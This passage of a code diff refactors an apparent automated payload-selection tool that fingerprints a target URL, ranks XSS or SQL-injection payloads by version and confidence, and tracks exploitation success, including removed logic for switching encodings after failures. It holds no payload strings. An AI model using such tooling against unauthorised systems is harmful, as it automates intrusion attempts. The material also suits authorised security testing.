-        return analysis
-    
-    def _adapt_weights(self, failure_analysis: Dict) -> Dict[str, float]:
-        """Adapt scoring weights based on failure analysis"""
-        weights = self.config['weights'].copy()
-        
-        # If many failures, reduce confidence weight and increase version weight
-        if len(failure_analysis['common_contexts']) > 2:
-            weights['confidence'] *= 0.7
-            weights['version'] *= 1.3
-        
-        # Normalize weights
-        total = sum(weights.values())
-        for key in weights:
-            weights[key] /= total
-        
-        return weights
-    
-    def _is_different_approach(self,
-                               payload: VulnPayload,
-                               failed_payloads: List[VulnPayload]) -> bool:
-        """Check if payload uses different approach than failed ones"""
-        # Check if context is different
-        failed_contexts = {p.context for p in failed_payloads}
-        if payload.context and payload.context not in failed_contexts:
-            return True
-        
-        # Check if length is significantly different
-        failed_lengths = [len(p.payload) for p in failed_payloads]
-        if failed_lengths:
-            avg_failed_length = np.mean(failed_lengths)
-            if abs(len(payload.payload) - avg_failed_length) > avg_failed_length * 0.5:
-                return True
-        
-        # Check for different encoding/technique
-        failed_patterns = set()
-        for p in failed_payloads:
-            if '<' in p.payload:
-                failed_patterns.add('html')
-            if 'script' in p.payload.lower():
-                failed_patterns.add('script')
-            if '%' in p.payload:
-                failed_patterns.add('urlencoded')
-        
-        payload_patterns = set()
-        if '<' in payload.payload:
-            payload_patterns.add('html')
-        if 'script' in payload.payload.lower():
-            payload_patterns.add('script')
-        if '%' in payload.payload:
-            payload_patterns.add('urlencoded')
-        
-        # Different if it doesn't share patterns with failed ones
-        return not payload_patterns.intersection(failed_patterns)
-    
-    def export_selection_report(self,
-                               ranked_payloads: List[RankedPayload],
-                               fingerprint: TargetFingerprint) -> Dict:
-        """Export detailed selection report"""
+    def export_report(self, ranked_payloads: List[RankedPayload]) -> Dict:
+        """Export detailed payload selection report"""
         return {
             'timestamp': datetime.now().isoformat(),
-            'target': {
-                'url': fingerprint.url,
-                'product': fingerprint.product,
-                'version': fingerprint.version,
-                'technologies': fingerprint.technologies
-            },
+            'total_payloads': len(ranked_payloads),
             'payloads': [
                 {
                     'rank': rp.rank,
-                    'name': rp.payload.name,
-                    'category': rp.payload.category.value,
-                    'payload': rp.payload.payload,
+                    'name': rp.name,
+                    'category': rp.category,
+                    'payload': rp.payload[:100] + '...' if len(rp.payload) > 100 else rp.payload,
                     'score': {
                         'total': rp.score.total,
-                        'version_match': rp.score.version_match,
                         'confidence': rp.score.confidence_base,
-                        'pattern_match': rp.score.pattern_match
+                        'version_match': rp.score.version_match
                     },
-                    'reasoning': rp.reasoning,
-                    'product_specific': rp.payload.product is not None,
-                    'version_specific': rp.payload.version_spec is not None
+                    'reasoning': rp.reasoning
                 }
                 for rp in ranked_payloads
-            ],
-            'config': self.config
+            ]
         }
 
+# ============================================================================
+# BACKWARD COMPATIBILITY CLASSES
+# ============================================================================
 
-# Integration helper class
+# Keep these for backward compatibility with existing code
+class PayloadManager(UnifiedPayloadManager):
+    """Alias for backward compatibility"""
+    pass
+
+class EnhancedPayloadManager(UnifiedPayloadManager):
+    """Alias for backward compatibility"""
+    pass
+
 class SmartPayloadSelector:
-    """High-level interface for payload selection"""
+    """Simplified interface for backward compatibility"""
     
     def __init__(self, kb_path: Optional[str] = None):
-        self.kb = VulnerabilityKnowledgeBase(kb_path) if kb_path else VulnerabilityKnowledgeBase()
-        self.manager = PayloadManager(self.kb)
-        self.fingerprints = {}  # Cache fingerprints
+        self.manager = UnifiedPayloadManager(kb_path)
     
-    def select_for_target(self,
-                         target: str,
-                         vulnerability: str,
-                         aggressive: bool = False,
-                         context: Optional[Dict] = None) -> List[Dict]:
-        """
-        Select payloads for a target URL and vulnerability type
-        
-        Args:
-            target: Target URL
-            vulnerability: Vulnerability type (e.g., 'XSS', 'SQLI')
-            aggressive: Use aggressive fingerprinting
-            context: Additional context
-            
-        Returns:
-            List of payload dictionaries with ranking info
-        """
-        # Get or create fingerprint
-        if target not in self.fingerprints:
-            from .fingerprinter import Fingerprinter
-            fp = Fingerprinter()
-            self.fingerprints[target] = fp.fingerprint(target, aggressive=aggressive)
-        
-        fingerprint = self.fingerprints[target]
-        
-        # Get vulnerability category
-        try:
-            vuln_category = VulnCategory[vulnerability.upper()]
-        except KeyError:
-            return []
-        
-        # Select payloads
-        ranked_payloads = self.manager.select_payloads(
-            fingerprint=fingerprint,
-            vulnerability=vuln_category,
-            context=context,
+    def select_for_target(self, target: str, vulnerability: str,
+                         aggressive: bool = False, context: Optional[Dict] = None) -> List[Dict]:
+        """Select payloads (backward compatible interface)"""
+        ranked = self.manager.get_payloads_for_target(
+            target_url=target,
+            vulnerability_type=vulnerability,
+            context=None,  # Convert dict context to PayloadContext if needed
             top_n=10
         )
         
-        # Convert to simple dictionaries
         return [
             {
-                'payload': rp.payload.payload,
-                'name': rp.payload.name,
+                'payload': rp.payload,
+                'name': rp.name,
                 'rank': rp.rank,
                 'score': rp.score.total,
                 'reasoning': rp.reasoning,
-                'confidence': rp.payload.confidence_score
+                'confidence': rp.score.confidence_base
             }
-            for rp in ranked_payloads
+            for rp in ranked
         ]
     
     def update_results(self, payload_name: str, success: bool):
-        """Update historical data based on exploitation results"""
-        # Find payload in KB
-        for category_payloads in self.kb.payloads.values():
-            for payload in category_payloads:
-                if payload.name == payload_name:
-                    self.manager.update_history(payload, success)
-                    return
+        """Update results (backward compatible)"""
+        self.manager.update_payload_success(payload_name, success)
